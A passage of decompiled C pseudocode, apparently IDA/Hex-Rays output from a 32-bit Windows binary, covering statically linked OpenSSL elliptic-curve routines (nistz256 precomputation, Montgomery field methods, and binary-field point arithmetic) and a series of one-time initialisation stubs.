        sub_408310(16, 243, 114, (int)"crypto\\ec\\ecp_nistz256.c", 834);
      }
      else
      {
        v6 = sub_4133F0(0x25040u);
        Block = v6;
        if ( v6 )
        {
          v7 = (int)v6 - ((unsigned __int8)v6 & 0x3F) + 64;
          v15 = v7;
          v2 = sub_435F90(a1);
          v8 = sub_435F90(a1);
          v10 = v8;
          if ( v2 && v8 && sub_4360B0(v8, v3) )
          {
            v12 = 0;
LABEL_19:
            if ( sub_4360B0(v2, v10) )
            {
              v14 = 0;
LABEL_21:
              if ( sub_436560((int)a1, v2, (int)a2) )
              {
                if ( sub_422380(v19, v2[1], 8) && sub_422380(v20, v2[2], 8) )
                {
                  sub_4AA1F0(v7, v19, v12);
                  v9 = 0;
                  while ( sub_436350((int)a1, v2, v2, (int)a2) )
                  {
                    if ( ++v9 >= 7 )
                    {
                      v7 += 4096;
                      if ( ++v14 < 37 )
                        goto LABEL_21;
                      if ( sub_4362D0((int)a1, v10, v10, v18, (int)a2) )
                      {
                        if ( ++v12 < 64 )
                        {
                          v7 = v15;
                          goto LABEL_19;
                        }
                        *((_DWORD *)v13 + 2) = v15;
                        *v13 = (volatile LONG)a1;
                        *((_DWORD *)v13 + 1) = 7;
                        *((_DWORD *)v13 + 3) = Block;
                        Block = 0;
                        a1[23] = 4;
                        a1[24] = (int)v13;
                        v13 = 0;
                        v17 = 1;
                      }
                      break;
                    }
                  }
                }
                else
                {
                  sub_408310(16, 243, 146, (int)"crypto\\ec\\ecp_nistz256.c", 874);
                }
              }
            }
          }
        }
        else
        {
          sub_408310(16, 243, 65, (int)"crypto\\ec\\ecp_nistz256.c", 842);
        }
      }
    }
    if ( a2 )
      sub_420750(a2);
  }
  sub_4206C0(v16);
  sub_45ABE0(v13);
  sub_413490(Block);
  sub_436040(v2);
  sub_436040(v10);
  return v17;
}
// 45AC80: using guessed type unsigned int var_40[8];
// 45AC80: using guessed type char var_20[32];

//----- (0045AFA0) --------------------------------------------------------
void *sub_45AFA0()
{
  return &unk_50F470;
}

//----- (0045AFB0) --------------------------------------------------------
int __cdecl sub_45AFB0(int a1)
{
  int result; // eax

  result = sub_4818D0(a1);
  *(_DWORD *)(a1 + 76) = 0;
  *(_DWORD *)(a1 + 80) = 0;
  return result;
}

//----- (0045AFD0) --------------------------------------------------------
void __cdecl sub_45AFD0(void ***Block)
{
  void **v1; // [esp-8h] [ebp-Ch]

  sub_4285A0(Block[19]);
  v1 = Block[20];
  Block[19] = 0;
  sub_417060(v1);
  Block[20] = 0;
  sub_481930(Block);
}

//----- (0045B000) --------------------------------------------------------
void __cdecl sub_45B000(_DWORD **Block)
{
  _DWORD *v1; // [esp-8h] [ebp-Ch]

  sub_4285A0(Block[19]);
  v1 = Block[20];
  Block[19] = 0;
  sub_417000(v1);
  Block[20] = 0;
  sub_481960(Block);
}

//----- (0045B030) --------------------------------------------------------
int __cdecl sub_45B030(int a1, int a2)
{
  _DWORD *v2; // eax
  void **v3; // eax
  _DWORD *v5; // [esp-8h] [ebp-10h]

  sub_4285A0(*(_DWORD **)(a1 + 76));
  v5 = *(_DWORD **)(a1 + 80);
  *(_DWORD *)(a1 + 76) = 0;
  sub_417000(v5);
  *(_DWORD *)(a1 + 80) = 0;
  if ( !sub_481990(a1, a2) )
    return 0;
  if ( *(_DWORD *)(a2 + 76) )
  {
    v2 = sub_4289A0();
    *(_DWORD *)(a1 + 76) = v2;
    if ( !v2 )
      return 0;
    if ( !sub_428820(v2, *(_DWORD **)(a2 + 76)) )
      goto LABEL_7;
  }
  if ( *(_DWORD *)(a2 + 80) )
  {
    v3 = sub_4176D0(*(_DWORD *)(a2 + 80));
    *(_DWORD *)(a1 + 80) = v3;
    if ( !v3 )
    {
LABEL_7:
      sub_4285A0(*(_DWORD **)(a1 + 76));
      *(_DWORD *)(a1 + 76) = 0;
      return 0;
    }
  }
  return 1;
}

//----- (0045B0D0) --------------------------------------------------------
int __usercall sub_45B0D0@<eax>(__m64 a1@<mm0>, int a2, int *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  unsigned int *v6; // ebx
  int *v7; // ebp
  _DWORD *v9; // eax
  _DWORD *v10; // edi
  int v11; // ebp
  int *v12; // eax
  void **v13; // [esp-Ch] [ebp-20h]
  void **v14; // [esp-8h] [ebp-1Ch]
  void **Block; // [esp+10h] [ebp-4h]

  v6 = 0;
  Block = 0;
  sub_4285A0(*(_DWORD **)(a2 + 76));
  v14 = *(void ***)(a2 + 80);
  *(_DWORD *)(a2 + 76) = 0;
  sub_417060(v14);
  v7 = a6;
  *(_DWORD *)(a2 + 80) = 0;
  if ( !a6 )
  {
    Block = (void **)sub_420670();
    v7 = (int *)Block;
    if ( !Block )
      return 0;
  }
  v9 = sub_4289A0();
  v10 = v9;
  if ( !v9 )
  {
LABEL_11:
    v11 = 0;
    goto LABEL_12;
  }
  if ( sub_4285F0(v9, (int **)a3, v7) )
  {
    v6 = sub_4168C0();
    if ( v6 )
    {
      v12 = (int *)sub_416820();
      if ( sub_416E50(a1, v6, v12, (int)v10, v7) )
      {
        *(_DWORD *)(a2 + 76) = v10;
        *(_DWORD *)(a2 + 80) = v6;
        v10 = 0;
        v6 = 0;
        v11 = sub_4819F0((int *)a2, a3, a4, a5, v7);
        if ( !v11 )
        {
          sub_4285A0(*(_DWORD **)(a2 + 76));
          v13 = *(void ***)(a2 + 80);
          *(_DWORD *)(a2 + 76) = 0;
          sub_417060(v13);
          *(_DWORD *)(a2 + 80) = 0;
        }
        goto LABEL_12;
      }
    }
    goto LABEL_11;
  }
  sub_408310(16, 189, 3, (int)"crypto\\ec\\ecp_mont.c", 157);
  v11 = 0;
LABEL_12:
  sub_417060((void **)v6);
  sub_4206C0(Block);
  sub_4285A0(v10);
  return v11;
}

//----- (0045B200) --------------------------------------------------------
int __usercall sub_45B200@<eax>(__m64 a1@<mm0>, int a2, unsigned int *a3, int *a4, int a5, int *a6)
{
  int v6; // eax

  v6 = *(_DWORD *)(a2 + 76);
  if ( v6 )
    return sub_428890(a1, a3, a4, a5, v6, a6);
  sub_408310(16, 131, 111, (int)"crypto\\ec\\ecp_mont.c", 191);
  return 0;
}

//----- (0045B250) --------------------------------------------------------
int __usercall sub_45B250@<eax>(__m64 a1@<mm0>, int a2, unsigned int *a3, int *a4, int *a5)
{
  int v5; // eax

  v5 = *(_DWORD *)(a2 + 76);
  if ( v5 )
    return sub_428890(a1, a3, a4, (int)a4, v5, a5);
  sub_408310(16, 132, 111, (int)"crypto\\ec\\ecp_mont.c", 202);
  return 0;
}

//----- (0045B2A0) --------------------------------------------------------
int __usercall sub_45B2A0@<eax>(__m64 a1@<mm0>, int a2, unsigned int *a3, int *a4, int *a5)
{
  int v5; // eax

  v5 = *(_DWORD *)(a2 + 76);
  if ( v5 )
    return sub_416E50(a1, a3, a4, v5, a5);
  sub_408310(16, 134, 111, (int)"crypto\\ec\\ecp_mont.c", 213);
  return 0;
}

//----- (0045B2F0) --------------------------------------------------------
int __cdecl sub_45B2F0(int a1, unsigned int *a2, _DWORD *a3, int *a4)
{
  int v4; // eax

  v4 = *(_DWORD *)(a1 + 76);
  if ( v4 )
    return sub_428540(a2, a3, v4, a4);
  sub_408310(16, 133, 111, (int)"crypto\\ec\\ecp_mont.c", 224);
  return 0;
}

//----- (0045B340) --------------------------------------------------------
BOOL __cdecl sub_45B340(int a1, _DWORD *a2)
{
  if ( *(_DWORD *)(a1 + 80) )
    return sub_4173E0(a2, *(_DWORD **)(a1 + 80)) != 0;
  sub_408310(16, 209, 111, (int)"crypto\\ec\\ecp_mont.c", 235);
  return 0;
}

//----- (0045B380) --------------------------------------------------------
void *sub_45B380()
{
  return &unk_50F550;
}

//----- (0045B390) --------------------------------------------------------
int __cdecl sub_45B390(void ***a1)
{
  void **v1; // eax
  void **v2; // ecx

  a1[9] = (void **)sub_4168C0();
  a1[16] = (void **)sub_4168C0();
  v1 = (void **)sub_4168C0();
  v2 = a1[9];
  a1[17] = v1;
  if ( v2 && a1[16] && v1 )
    return 1;
  sub_417060(v2);
  sub_417060(a1[16]);
  sub_417060(a1[17]);
  return 0;
}

//----- (0045B3F0) --------------------------------------------------------
int __cdecl sub_45B3F0(int a1)
{
  int result; // eax

  sub_417000(*(_DWORD **)(a1 + 36));
  sub_417000(*(_DWORD **)(a1 + 64));
  sub_417000(*(_DWORD **)(a1 + 68));
  result = 0;
  *(_DWORD *)(a1 + 40) = 0;
  *(_DWORD *)(a1 + 44) = 0;
  *(_DWORD *)(a1 + 48) = 0;
  *(_DWORD *)(a1 + 52) = 0;
  *(_DWORD *)(a1 + 56) = 0;
  *(_DWORD *)(a1 + 60) = -1;
  return result;
}

//----- (0045B430) --------------------------------------------------------
int __cdecl sub_45B430(int a1, int a2)
{
  int v3; // eax

  if ( !sub_4173E0(*(_DWORD **)(a1 + 36), *(_DWORD **)(a2 + 36)) )
    return 0;
  if ( !sub_4173E0(*(_DWORD **)(a1 + 64), *(_DWORD **)(a2 + 64)) )
    return 0;
  if ( !sub_4173E0(*(_DWORD **)(a1 + 68), *(_DWORD **)(a2 + 68)) )
    return 0;
  *(_DWORD *)(a1 + 40) = *(_DWORD *)(a2 + 40);
  *(_DWORD *)(a1 + 44) = *(_DWORD *)(a2 + 44);
  *(_DWORD *)(a1 + 48) = *(_DWORD *)(a2 + 48);
  *(_DWORD *)(a1 + 52) = *(_DWORD *)(a2 + 52);
  v3 = *(_DWORD *)(a1 + 40) + 31;
  *(_DWORD *)(a1 + 56) = *(_DWORD *)(a2 + 56);
  *(_DWORD *)(a1 + 60) = *(_DWORD *)(a2 + 60);
  if ( !sub_4173C0(*(_DWORD *)(a1 + 64), v3 / 32) || !sub_4173C0(*(_DWORD *)(a1 + 68), (*(_DWORD *)(a1 + 40) + 31) / 32) )
    return 0;
  sub_422360(*(_DWORD **)(a1 + 64));
  sub_422360(*(_DWORD **)(a1 + 68));
  return 1;
}

//----- (0045B500) --------------------------------------------------------
int __cdecl sub_45B500(int *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  _DWORD *v4; // edi
  int v5; // eax

  if ( !sub_4173E0((_DWORD *)a1[9], a2) )
    return 0;
  v4 = a1 + 10;
  v5 = sub_4802A0(a1[9], (int)(a1 + 10), 6) - 1;
  if ( v5 != 5 && v5 != 3 )
  {
    sub_408310(16, 195, 131, (int)"crypto\\ec\\ec2_smpl.c", 180);
    return 0;
  }
  if ( !sub_47FF20((_DWORD *)a1[16], a3, a1 + 10) )
    return 0;
  if ( !sub_4173C0(a1[16], (*v4 + 31) / 32) )
    return 0;
  sub_422360((_DWORD *)a1[16]);
  if ( !sub_47FF20((_DWORD *)a1[17], a4, a1 + 10) || !sub_4173C0(a1[17], (*v4 + 31) / 32) )
    return 0;
  sub_422360((_DWORD *)a1[17]);
  return 1;
}

//----- (0045B5F0) --------------------------------------------------------
int __cdecl sub_45B5F0(_DWORD **a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // edi
  int result; // eax

  v4 = 0;
  if ( !a2 || (result = (int)sub_4173E0(a2, a1[9])) != 0 )
  {
    if ( (!a3 || sub_4173E0(a3, a1[16])) && (!a4 || sub_4173E0(a4, a1[17])) )
      return 1;
    return v4;
  }
  return result;
}

//----- (0045B650) --------------------------------------------------------
int __cdecl sub_45B650(int a1)
{
  return sub_416F90(*(_DWORD **)(a1 + 36)) - 1;
}

//----- (0045B670) --------------------------------------------------------
int __cdecl sub_45B670(int a1, int *a2)
{
  int *v2; // esi
  int v3; // ebp
  void **v4; // edi
  _DWORD *v6; // ebx

  v2 = a2;
  v3 = 0;
  v4 = 0;
  if ( a2 || (v4 = (void **)sub_420670(), (v2 = (int *)v4) != 0) )
  {
    sub_420700(v2);
    v6 = sub_420790(v2);
    if ( v6 && sub_47FF20(v6, *(_DWORD **)(a1 + 68), (_DWORD *)(a1 + 40)) && !sub_416DB0((int)v6) )
      v3 = 1;
    if ( v2 )
      sub_420750(v2);
    sub_4206C0(v4);
    return v3;
  }
  else
  {
    sub_408310(16, 159, 65, (int)"crypto\\ec\\ec2_smpl.c", 259);
    sub_4206C0(0);
    return 0;
  }
}

//----- (0045B720) --------------------------------------------------------
int __cdecl sub_45B720(void ***a1)
{
  void **v1; // eax
  void **v2; // ecx

  a1[1] = (void **)sub_4168C0();
  a1[2] = (void **)sub_4168C0();
  v1 = (void **)sub_4168C0();
  v2 = a1[1];
  a1[3] = v1;
  if ( v2 && a1[2] && v1 )
    return 1;
  sub_417060(v2);
  sub_417060(a1[2]);
  sub_417060(a1[3]);
  return 0;
}

//----- (0045B780) --------------------------------------------------------
void __cdecl sub_45B780(int a1)
{
  sub_417000(*(_DWORD **)(a1 + 4));
  sub_417000(*(_DWORD **)(a1 + 8));
  sub_417000(*(_DWORD **)(a1 + 12));
  *(_DWORD *)(a1 + 16) = 0;
}

//----- (0045B7B0) --------------------------------------------------------
int __cdecl sub_45B7B0(int a1, int a2)
{
  if ( !sub_4173E0(*(_DWORD **)(a1 + 4), *(_DWORD **)(a2 + 4))
    || !sub_4173E0(*(_DWORD **)(a1 + 8), *(_DWORD **)(a2 + 8))
    || !sub_4173E0(*(_DWORD **)(a1 + 12), *(_DWORD **)(a2 + 12)) )
  {
    return 0;
  }
  *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
  return 1;
}

//----- (0045B810) --------------------------------------------------------
int __cdecl sub_45B810(int a1, int *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // ebx
  void **v5; // eax

  v4 = 0;
  if ( a3 && a4 )
  {
    if ( sub_4173E0((_DWORD *)a2[1], a3) )
    {
      sub_417390(a2[1], 0);
      if ( sub_4173E0((_DWORD *)a2[2], a4) )
      {
        sub_417390(a2[2], 0);
        v5 = sub_416820();
        if ( sub_4173E0((_DWORD *)a2[3], v5) )
        {
          sub_417390(a2[3], 0);
          v4 = 1;
          a2[4] = 1;
        }
      }
    }
    return v4;
  }
  else
  {
    sub_408310(16, 163, 67, (int)"crypto\\ec\\ec2_smpl.c", 361);
    return 0;
  }
}

//----- (0045B8B0) --------------------------------------------------------
int __cdecl sub_45B8B0(int a1, int a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // ebx
  void **v6; // eax

  v4 = 0;
  if ( sub_436430(a1, (_DWORD *)a2) )
  {
    sub_408310(16, 162, 106, (int)"crypto\\ec\\ec2_smpl.c", 394);
    return 0;
  }
  v6 = sub_416820();
  if ( sub_4169B0(*(_DWORD **)(a2 + 12), v6) )
  {
    sub_408310(16, 162, 66, (int)"crypto\\ec\\ec2_smpl.c", 400);
    return 0;
  }
  if ( a3 )
  {
    if ( !sub_4173E0(a3, *(_DWORD **)(a2 + 4)) )
      return v4;
    sub_417390((int)a3, 0);
  }
  if ( !a4 )
    return 1;
  if ( sub_4173E0(a4, *(_DWORD **)(a2 + 8)) )
  {
    sub_417390((int)a4, 0);
    return 1;
  }
  return v4;
}

//----- (0045B980) --------------------------------------------------------
BOOL __cdecl sub_45B980(_DWORD **a1, _DWORD *a2, int a3, int a4, int *a5)
{
  int *v6; // esi
  _DWORD *v7; // ebp
  _DWORD *v8; // ebx
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  int v11; // eax
  int v12; // eax
  int *v13; // [esp+Ch] [ebp-20h]
  int *v14; // [esp+10h] [ebp-1Ch]
  _DWORD *v15; // [esp+14h] [ebp-18h]
  _DWORD *v16; // [esp+18h] [ebp-14h]
  _DWORD *v17; // [esp+1Ch] [ebp-10h]
  int v18; // [esp+20h] [ebp-Ch]
  _DWORD *v19; // [esp+24h] [ebp-8h]
  void **Block; // [esp+28h] [ebp-4h]

  Block = 0;
  v18 = 0;
  if ( sub_436430((int)a1, (_DWORD *)a3) )
    return sub_4360B0(a2, (_DWORD *)a4) != 0;
  if ( sub_436430((int)a1, (_DWORD *)a4) )
    return sub_4360B0(a2, (_DWORD *)a3) != 0;
  v6 = a5;
  if ( !a5 )
  {
    Block = (void **)sub_420670();
    v6 = (int *)Block;
    if ( !Block )
      return 0;
  }
  sub_420700(v6);
  v15 = sub_420790(v6);
  v16 = sub_420790(v6);
  v13 = sub_420790(v6);
  v14 = sub_420790(v6);
  v7 = sub_420790(v6);
  v19 = sub_420790(v6);
  v8 = sub_420790(v6);
  v17 = sub_420790(v6);
  if ( v17 )
  {
    if ( *(_DWORD *)(a3 + 16) )
    {
      if ( !sub_4173E0(v15, *(_DWORD **)(a3 + 4)) )
        goto LABEL_43;
      v9 = sub_4173E0(v16, *(_DWORD **)(a3 + 8));
    }
    else
    {
      v9 = (_DWORD *)sub_436260((int)a1, (_DWORD *)a3, (int)v15, (int)v16, (int)v6);
    }
    if ( v9 )
    {
      if ( *(_DWORD *)(a4 + 16) )
      {
        if ( !sub_4173E0(v13, *(_DWORD **)(a4 + 4)) )
          goto LABEL_43;
        v10 = sub_4173E0(v14, *(_DWORD **)(a4 + 8));
      }
      else
      {
        v10 = (_DWORD *)sub_436260((int)a1, (_DWORD *)a4, (int)v13, (int)v14, (int)v6);
      }
      if ( v10 )
      {
        if ( sub_416960(v15, v13) )
        {
          if ( !sub_47FE90(v17, v15, v13)
            || !sub_47FE90(v8, v16, v14)
            || !((int (__cdecl *)(_DWORD **, _DWORD *, _DWORD *, _DWORD *, int *))(*a1)[36])(a1, v8, v8, v17, v6)
            || !((int (__cdecl *)(_DWORD **, _DWORD *, _DWORD *, int *))(*a1)[35])(a1, v7, v8, v6)
            || !sub_47FE90(v7, v7, a1[16])
            || !sub_47FE90(v7, v7, v8) )
          {
            goto LABEL_43;
          }
          v11 = sub_47FE90(v7, v7, v17);
        }
        else
        {
          if ( sub_416960(v16, v14) || sub_416DB0((int)v13) )
          {
            v12 = sub_436120((int)a1, a2);
LABEL_41:
            if ( v12 )
              v18 = 1;
            goto LABEL_43;
          }
          if ( !((int (__cdecl *)(_DWORD **, _DWORD *, int *, int *, int *))(*a1)[36])(a1, v8, v14, v13, v6)
            || !sub_47FE90(v8, v8, v13)
            || !((int (__cdecl *)(_DWORD **, _DWORD *, _DWORD *, int *))(*a1)[35])(a1, v7, v8, v6)
            || !sub_47FE90(v7, v7, v8) )
          {
            goto LABEL_43;
          }
          v11 = sub_47FE90(v7, v7, a1[16]);
        }
        if ( !v11
          || !sub_47FE90(v19, v13, v7)
          || !((int (__cdecl *)(_DWORD **, _DWORD *, _DWORD *, _DWORD *, int *))(*a1)[34])(a1, v19, v19, v8, v6)
          || !sub_47FE90(v19, v19, v7)
          || !sub_47FE90(v19, v19, v14) )
        {
          goto LABEL_43;
        }
        v12 = sub_436EA0((int)a1, a2, (int)v7, (int)v19, (int)v6);
        goto LABEL_41;
      }
    }
  }
LABEL_43:
  sub_420750(v6);
  sub_4206C0(Block);
  return v18;
}

//----- (0045BD30) --------------------------------------------------------
BOOL __cdecl sub_45BD30(_DWORD **a1, _DWORD *a2, int a3, int *a4)
{
  return sub_45B980(a1, a2, a3, a3, a4);
}

//----- (0045BD50) --------------------------------------------------------
int __cdecl sub_45BD50(int a1, int a2, int a3)
{
  int result; // eax

  if ( sub_436430(a1, (_DWORD *)a2) || sub_416DB0(*(_DWORD *)(a2 + 8)) )
    return 1;
  result = sub_436560(a1, (_DWORD *)a2, a3);
  if ( result )
    return sub_47FE90(*(_DWORD **)(a2 + 8), *(_DWORD **)(a2 + 4), *(_DWORD **)(a2 + 8));
  return result;
}

//----- (0045BDB0) --------------------------------------------------------
int __cdecl sub_45BDB0(_DWORD **a1, int a2, int *a3)
{
  int *v4; // edi
  _DWORD *v5; // esi
  int (__cdecl *v6)(_DWORD **, _DWORD *, _DWORD *, _DWORD, int *); // [esp+8h] [ebp-14h]
  void **Block; // [esp+Ch] [ebp-10h]
  int v8; // [esp+10h] [ebp-Ch]
  _DWORD *v9; // [esp+14h] [ebp-8h]
  int (__cdecl *v10)(_DWORD **, _DWORD *, _DWORD, int *); // [esp+18h] [ebp-4h]

  v8 = -1;
  Block = 0;
  if ( sub_436430((int)a1, (_DWORD *)a2) )
    return 1;
  v6 = (int (__cdecl *)(_DWORD **, _DWORD *, _DWORD *, _DWORD, int *))(*a1)[34];
  v10 = (int (__cdecl *)(_DWORD **, _DWORD *, _DWORD, int *))(*a1)[35];
  if ( !*(_DWORD *)(a2 + 16) )
    return -1;
  v4 = a3;
  if ( !a3 )
  {
    Block = (void **)sub_420670();
    v4 = (int *)Block;
    if ( !Block )
      return -1;
  }
  sub_420700(v4);
  v9 = sub_420790(v4);
  v5 = sub_420790(v4);
  if ( v5
    && sub_47FE90(v5, *(_DWORD **)(a2 + 4), a1[16])
    && v6(a1, v5, v5, *(_DWORD *)(a2 + 4), v4)
    && sub_47FE90(v5, v5, *(_DWORD **)(a2 + 8))
    && v6(a1, v5, v5, *(_DWORD *)(a2 + 4), v4)
    && sub_47FE90(v5, v5, a1[17])
    && v10(a1, v9, *(_DWORD *)(a2 + 8), v4)
    && sub_47FE90(v5, v5, v9) )
  {
    v8 = sub_416DB0((int)v5);
  }
  if ( v4 )
    sub_420750(v4);
  sub_4206C0(Block);
  return v8;
}

//----- (0045BF10) --------------------------------------------------------
int __cdecl sub_45BF10(int a1, int a2, int a3, int *a4)
{
  int result; // eax
  int *v5; // esi
  _DWORD *v6; // ebp
  _DWORD *v7; // edi
  int v8; // [esp+8h] [ebp-10h]
  _DWORD *v9; // [esp+Ch] [ebp-Ch]
  _DWORD *v10; // [esp+10h] [ebp-8h]
  void **Block; // [esp+14h] [ebp-4h]

  Block = 0;
  v8 = -1;
  if ( sub_436430(a1, (_DWORD *)a2) )
    return sub_436430(a1, (_DWORD *)a3) == 0;
  if ( sub_436430(a1, (_DWORD *)a3) )
    return 1;
  if ( *(_DWORD *)(a2 + 16) && *(_DWORD *)(a3 + 16) )
  {
    if ( sub_4169B0(*(_DWORD **)(a2 + 4), *(_DWORD **)(a3 + 4)) )
      return 1;
    result = sub_4169B0(*(_DWORD **)(a2 + 8), *(_DWORD **)(a3 + 8));
    if ( result )
      return 1;
  }
  else
  {
    v5 = a4;
    if ( a4 || (Block = (void **)sub_420670(), (v5 = (int *)Block) != 0) )
    {
      sub_420700(v5);
      v6 = sub_420790(v5);
      v10 = sub_420790(v5);
      v9 = sub_420790(v5);
      v7 = sub_420790(v5);
      if ( v7 )
      {
        if ( sub_436260(a1, (_DWORD *)a2, (int)v6, (int)v10, (int)v5) )
        {
          if ( sub_436260(a1, (_DWORD *)a3, (int)v9, (int)v7, (int)v5) )
          {
            if ( sub_4169B0(v6, v9) || (v8 = 0, sub_4169B0(v10, v7)) )
              v8 = 1;
          }
        }
      }
      if ( v5 )
        sub_420750(v5);
      sub_4206C0(Block);
      return v8;
    }
    else
    {
      return -1;
    }
  }
  return result;
}

//----- (0045C0A0) --------------------------------------------------------
int __cdecl sub_45C0A0(int a1, int a2, int *a3)
{
  int *v3; // esi
  _DWORD *v5; // ebp
  _DWORD *v6; // eax
  _DWORD *v7; // ebx
  void **Block; // [esp+8h] [ebp-8h]
  int v9; // [esp+Ch] [ebp-4h]

  Block = 0;
  v9 = 0;
  if ( *(_DWORD *)(a2 + 16) || sub_436430(a1, (_DWORD *)a2) )
    return 1;
  v3 = a3;
  if ( !a3 )
  {
    Block = (void **)sub_420670();
    v3 = (int *)Block;
    if ( !Block )
      return 0;
  }
  sub_420700(v3);
  v5 = sub_420790(v3);
  v6 = sub_420790(v3);
  v7 = v6;
  if ( v6
    && sub_436260(a1, (_DWORD *)a2, (int)v5, (int)v6, (int)v3)
    && sub_4173E0(*(_DWORD **)(a2 + 4), v5)
    && sub_4173E0(*(_DWORD **)(a2 + 8), v7)
    && sub_417490(*(_DWORD **)(a2 + 12), 1) )
  {
    *(_DWORD *)(a2 + 16) = 1;
    v9 = 1;
  }
  if ( v3 )
    sub_420750(v3);
  sub_4206C0(Block);
  return v9;
}

//----- (0045C1A0) --------------------------------------------------------
int __cdecl sub_45C1A0(int a1, unsigned int a2, int a3, int a4)
{
  int v4; // esi

  v4 = 0;
  if ( !a2 )
    return 1;
  while ( (*(int (__cdecl **)(int, _DWORD, int))(*(_DWORD *)a1 + 116))(a1, *(_DWORD *)(a3 + 4 * v4), a4) )
  {
    if ( ++v4 >= a2 )
      return 1;
  }
  return 0;
}

//----- (0045C1F0) --------------------------------------------------------
int __usercall sub_45C1F0@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  return sub_480410(a1, a3, a4, a5, (_DWORD *)(a2 + 40), a6);
}

//----- (0045C220) --------------------------------------------------------
int __cdecl sub_45C220(int a1, _DWORD *a2, _DWORD *a3, int *a4)
{
  return sub_480160(a2, a3, (_DWORD *)(a1 + 40), a4);
}

//----- (0045C240) --------------------------------------------------------
BOOL __usercall sub_45C240@<eax>(__m64 a1@<mm0>, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int *a6)
{
  return sub_4809E0(a1, a3, a4, a5, *(_DWORD **)(a2 + 36), a6);
}

//----- (0045C270) --------------------------------------------------------
void *sub_45C270()
{
  return &unk_50F630;
}

//----- (0045C280) --------------------------------------------------------
int sub_45C280()
{
  if ( !sub_407E50(dword_5318F8) )
  {
    sub_407CD0(0, &dword_5318F8);
    sub_407CD0(0, &dword_531910);
  }
  return 1;
}
// 5318F8: using guessed type int dword_5318F8;
// 531910: using guessed type _DWORD dword_531910;

//----- (0045C2C0) --------------------------------------------------------
int sub_45C2C0()
{
  if ( !sub_407E50(dword_531930) )
  {
    sub_407CD0(0, &dword_531930);
    sub_407CD0(0, &dword_531968);
  }
  return 1;
}
// 531930: using guessed type int dword_531930;
// 531968: using guessed type _DWORD dword_531968;

//----- (0045C300) --------------------------------------------------------
int sub_45C300()
{
  if ( !sub_407E50(dword_531990) )
  {
    sub_407CD0(0, &dword_531990);
    sub_407CD0(0, &dword_531A70);
  }
  return 1;
}
// 531990: using guessed type int dword_531990;
// 531A70: using guessed type _DWORD dword_531A70;

//----- (0045C340) --------------------------------------------------------
int sub_45C340()
{
  if ( !sub_407E50(dword_531AF8) )
  {
    sub_407CD0(0, &dword_531AF8);
    sub_407CD0(0, &dword_531D80);
  }
  return 1;
}
// 531AF8: using guessed type int dword_531AF8;
// 531D80: using guessed type _DWORD dword_531D80;

//----- (0045C380) --------------------------------------------------------
int sub_45C380()
{
  if ( !sub_407E50(dword_532018) )
  {
    sub_407CD0(0, &dword_532018);
    sub_407CD0(0, &dword_532080);
  }
  return 1;
}
// 532018: using guessed type int dword_532018;
// 532080: using guessed type _DWORD dword_532080;

//----- (0045C3C0) --------------------------------------------------------
int sub_45C3C0()
{
  if ( !sub_407E50(dword_5320C0) )
  {
    sub_407CD0(0, &dword_5320C0);
    sub_407CD0(0, &dword_532140);
  }
  return 1;
}
// 5320C0: using guessed type int dword_5320C0;
// 532140: using guessed type _DWORD dword_532140;

//----- (0045C400) --------------------------------------------------------
int sub_45C400()
{
  if ( !sub_407E50(dword_532218) )
  {
    sub_407CD0(0, &dword_532218);
    sub_407CD0(0, &dword_532348);
  }
  return 1;
}
// 532218: using guessed type int dword_532218;
// 532348: using guessed type _DWORD dword_532348;

//----- (0045C440) --------------------------------------------------------
int sub_45C440()
{
  if ( !sub_407E50(dword_532468) )
  {
    sub_407CD0(0, &dword_532468);
    sub_407CD0(0, &dword_532620);
  }
  return 1;
}
// 532468: using guessed type int dword_532468;
// 532620: using guessed type _DWORD dword_532620;

//----- (0045C480) --------------------------------------------------------
int sub_45C480()
{
  if ( !sub_407E50(dword_532758) )
  {
    sub_407CD0(0, &dword_532758);
    sub_407CD0(0, &dword_532868);
  }
  return 1;
}
// 532758: using guessed type int dword_532758;
// 532868: using guessed type _DWORD dword_532868;

//----- (0045C4C0) --------------------------------------------------------
int sub_45C4C0()
{
  if ( !sub_407E50(dword_5328F0) )
  {
    sub_407CD0(0, &dword_5328F0);
    sub_407CD0(0, &dword_532900);
  }
  return 1;
}
// 5328F0: using guessed type int dword_5328F0;
// 532900: using guessed type _DWORD dword_532900;

//----- (0045C500) --------------------------------------------------------
int sub_45C500()
{
  if ( !sub_407E50(dword_532910) )
  {
    sub_407CD0(0, &dword_532910);
    sub_407CD0(0, &dword_5329E0);
  }
  return 1;
}
// 532910: using guessed type int dword_532910;
// 5329E0: using guessed type _DWORD dword_5329E0;

//----- (0045C540) --------------------------------------------------------
int sub_45C540()
{
  if ( !sub_407E50(dword_532A90) )
  {
    sub_407CD0(0, &dword_532A90);
    sub_407CD0(0, &dword_532C78);
  }
  return 1;
}
// 532A90: using guessed type int dword_532A90;
// 532C78: using guessed type _DWORD dword_532C78;

//----- (0045C580) --------------------------------------------------------
int sub_45C580()
{
  if ( !sub_407E50(dword_532E88) )
  {
    sub_407CD0(0, &dword_532E88);
    sub_407CD0(0, &dword_532FA0);
  }
  return 1;
}
// 532E88: using guessed type int dword_532E88;
// 532FA0: using guessed type _DWORD dword_532FA0;

//----- (0045C5C0) --------------------------------------------------------
int sub_45C5C0()
{
  if ( !sub_407E50(dword_5330D8) )
  {
    sub_407CD0(0, &dword_5330D8);
    sub_407CD0(0, &dword_533220);
  }
  return 1;
}
// 5330D8: using guessed type int dword_5330D8;
// 533220: using guessed type _DWORD dword_533220;

//----- (0045C600) --------------------------------------------------------
int sub_45C600()
{
  if ( !sub_407E50(dword_533348) )
  {
    sub_407CD0(0, &dword_533348);
    sub_407CD0(0, &dword_5337D8);
  }
  return 1;
}
// 533348: using guessed type int dword_533348;
// 5337D8: using guessed type _DWORD dword_5337D8;

//----- (0045C640) --------------------------------------------------------
int sub_45C640()
{
  if ( !sub_407E50(dword_5339B8) )
  {
    sub_407CD0(0, &dword_5339B8);
    sub_407CD0(0, &dword_5339E0);
  }
  return 1;
}
// 5339B8: using guessed type int dword_5339B8;
